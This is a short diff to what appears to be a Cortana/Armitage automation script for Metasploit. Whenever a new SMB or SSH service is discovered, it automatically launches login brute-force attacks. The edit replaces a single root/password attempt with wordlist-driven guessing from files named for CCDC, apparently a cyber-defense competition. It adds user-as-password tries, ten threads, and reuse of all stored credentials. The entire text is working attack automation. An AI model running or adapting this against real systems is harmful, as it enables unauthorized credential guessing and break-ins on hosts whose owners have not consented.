@@ -1,6 +1,14 @@
 on service_add_445 {
 	println("Bruteforcing new SMB service on $1");
-	auxiliary("scanner/smb/smb_login", @($1), %());
+	auxiliary("scanner/smb/smb_login", @($1), %(
+		USER_FILE =>	"/root/ccdc_users.txt",
+		PASS_FILE => 	"/root/ccdc_passwords.txt",
+    USER_AS_PASS => "true",
+    VERBOSE => "false",
+    THREADS => "10",
+    DB_ALL_USERS => "true",
+    DB_ALL_PASS => "true",
+  ));
 }
 
 on service_add_1433 {
@@ -11,7 +19,12 @@ on service_add_1433 {
 on service_add_22 {
 	println("Bruteforcing new SSH service on $1");
 	auxiliary("scanner/ssh/ssh_login", @($1), %(
-		USERNAME =>	"root",
-		PASSWORD => 	"password"
+		USER_FILE =>	"/root/ccdc_users.txt",
+		PASS_FILE => 	"/root/ccdc_passwords.txt",
+    USER_AS_PASS => "true",
+    VERBOSE => "false",
+    THREADS => "10",
+    DB_ALL_USERS => "true",
+    DB_ALL_PASS => "true",
 	));
 }
